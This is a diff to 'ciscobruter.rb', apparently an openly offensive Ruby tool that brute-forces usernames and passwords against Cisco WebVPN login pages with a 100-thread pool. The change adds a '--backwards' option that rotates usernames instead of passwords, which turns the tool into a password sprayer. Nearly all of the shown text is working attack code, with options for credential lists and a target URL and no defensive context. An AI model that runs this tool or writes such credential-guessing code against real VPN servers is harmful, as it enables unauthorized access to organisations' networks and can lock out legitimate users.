@@ -10,13 +10,14 @@ include Celluloid::Internals::Logger
 
 options = {}
 args = OptionParser.new do |opts|
-  opts.banner = "ciscobruter.rb VERSION: 1.0.0 - UPDATED: 01/20/2016\r\n\r\n"
+  opts.banner = "ciscobruter.rb VERSION: 1.0.1 - UPDATED: 03/05/2017\r\n\r\n"
   opts.on("-u", "--username   [Username]", "\tUsername to guess passwords against") { |username| options[:usernames] = [username] }
   opts.on("-p", "--password   [Password]", "\tPassword to try with username") { |password| options[:passwords] = [password] }
   opts.on("-U", "--user-file  [File Path]", "\tFile containing list of usernames") { |usernames| options[:usernames] = File.open(usernames, 'r').read.split("\n") }
   opts.on("-P", "--pass-file  [File Path]", "\tFile containing list of passwords") { |passwords| options[:passwords] = File.open(passwords, 'r').read.split("\n") }
   opts.on("-t", "--target     [URL]", "\tTarget VPN server example: https://vpn.target.com") { |target| options[:target] = target }
   opts.on("-l", "--login-path  [Login Path]", "\tPath to login page.  Default: /+webvpn+/index.html") { |path| options[:path] = path }
+  opts.on("-b", "--backwards", "\tRotate usernames instead of passwords") { |b| options[:backwards] = true }
   opts.on("-v", "--verbose", "\tEnables verbose output\r\n\r\n") { |v| options[:verbose] = true }
 end
 
@@ -89,15 +90,29 @@ end
 def main(options, total)
 	threads = Thread.pool(100)
 	info "Trying #{total} username/password combinations..."
-	options[:usernames].each do |username|
+	
+	if options[:backwards]
 		options[:passwords].each do |password|
-			threads.process {
-				bruter = Ciscobruter.new(options[:target], options[:verbose], options[:path])
-				bruter.try_credentials(username.chomp, password.chomp)
-				PROGRESS.increment
-			}
+			options[:usernames].each do |username|
+				threads.process {
+					bruter = Ciscobruter.new(options[:target], options[:verbose], options[:path])
+					bruter.try_credentials(username.chomp, password.chomp)
+					PROGRESS.increment
+				}
+			end
+		end
+	else
+		options[:usernames].each do |username|
+			options[:passwords].each do |password|
+				threads.process {
+					bruter = Ciscobruter.new(options[:target], options[:verbose], options[:path])
+					bruter.try_credentials(username.chomp, password.chomp)
+					PROGRESS.increment
+				}
+			end
 		end
 	end
+
 	threads.shutdown
 end
 
